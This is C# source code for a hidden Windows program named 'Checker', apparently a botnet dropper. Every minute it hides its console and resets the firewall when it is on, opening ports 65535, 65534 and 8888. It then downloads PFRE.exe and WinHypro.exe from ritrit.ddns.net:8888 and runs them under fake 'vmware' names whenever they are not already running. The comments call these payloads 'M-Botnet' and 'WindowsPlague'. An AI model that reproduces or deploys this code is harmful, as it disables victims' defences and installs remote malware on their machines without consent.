using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

namespace Checker
{
    class Class1
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        private void down(string path, string filename, string url)
        {
            // Download

            try
            {
                FileInfo file = new FileInfo(filename);
                using (WebClient Client = new WebClient())
                {

                    Client.DownloadFile(url, file.FullName);
                    //Process.Start(file.FullName);

                }
                File.Copy(file.FullName, path);
                File.Delete(file.FullName);
            }
            catch
            {
            }


        }


        static Process execute(string command)
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            // netsh advfirewall show domain state
            process.StartInfo.Arguments = "/c " + command; // Note the /c command (*)
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = false;
            process.Start();
            return process;
        }



        // This is C:\Windows\WMSys.exe

        static void Main(string[] args)
        {
            Class1 c = new Class1();
            var handle = GetConsoleWindow();
            // Hide
            ShowWindow(handle, SW_HIDE);

            var startTimeSpan = TimeSpan.Zero;
            var periodTimeSpan = TimeSpan.FromMinutes(5);


            while (true)
            {
                // Every 5 mins
                //Thread.Sleep(60 * 5 * 1000);
                // Every 1 min
                Thread.Sleep(60 * 1 * 1000);





                // Firewall 
                try
                {
                    Process process = execute("netsh advfirewall show domain state");
                    string output = process.StandardOutput.ReadToEnd();
                    Console.WriteLine(output);
                    if (output.Contains("ON"))
                    {
                        process = execute("netsh advfirewall reset");
                        process = execute("netsh advfirewall firewall add rule name=\"Protected\" protocol=TCP dir=out localport=65535 action=allow");
                        process = execute("netsh advfirewall firewall add rule name=\"Protected\" protocol=TCP dir=out localport=65534 action=allow");
                        process = execute("netsh advfirewall firewall add rule name=\"Protected\" protocol=TCP dir=out localport=8888 action=allow");
                        process = execute("netsh advfirewall firewall add rule name=\"Protected\" protocol=TCP dir=in localport=65535 action=allow");
                        process = execute("netsh advfirewall firewall add rule name=\"Protected\" protocol=TCP dir=in localport=65534 action=allow");
                        process = execute("netsh advfirewall firewall add rule name=\"Protected\" protocol=TCP dir=in localport=8888 action=allow");
                        //Console.WriteLine("It's ONNNNN");
                    }
                }
                catch { }





                // Call M-Botnet
                bool vmware01 = true;
                // WindowsPlague 
                bool vmware02 = true;
                Process[] procs = Process.GetProcesses();
                foreach (Process proc in procs)
                {
                    try
                    {
                        //Console.WriteLine("Name:" + proc.ProcessName + " Path:" + proc.MainModule.FileName + " Id:" + proc.Id);
                        if (proc.ProcessName.Contains("vmware-001"))
                        {
                            vmware01 = false;
                        }
                        if (proc.ProcessName.Contains("vmware-002"))
                        {
                            vmware02 = false;
                        }
                    }
                    catch
                    {
                        continue;
                    }
                }

                if (vmware01)
                {
                    string sourceFile = @"C:\Windows\PFRE.exe";
                    string destinationFile = @"C:\ProgramData\Microsoft\Windows\Caches\$vmware-001.exe";

                    //System.IO.File.Delete(destinationFile);
                    if (!System.IO.File.Exists(destinationFile))
                    {
                        if (!File.Exists(sourceFile))
                        {
                            c.down(@"C:\Windows\PFRE.exe", "AdoInstall.exe", "http://ritrit.ddns.net:8888/PFRE.exe");
                        }
                        System.IO.File.Copy(sourceFile, destinationFile);
                    }

                    Process.Start(destinationFile);
                }
                if (vmware02)
                {
                    string sourceFile = @"C:\Windows\WinHypro.exe";
                    string destinationFile = @"C:\ProgramData\Microsoft\Windows\Caches\$vmware-002.exe";

                    //System.IO.File.Delete(destinationFile);
                    if (!File.Exists(destinationFile))
                    {
                        if (!File.Exists(sourceFile))
                        {
                            c.down(@"C:\Windows\WinHypro.exe", "vmware-tools.exe", "http://ritrit.ddns.net:8888/WinHypro.exe");
                        }
                        File.Copy(sourceFile, destinationFile);

                    }
                    Process.Start(destinationFile);
                }
            }

        }
    }
}
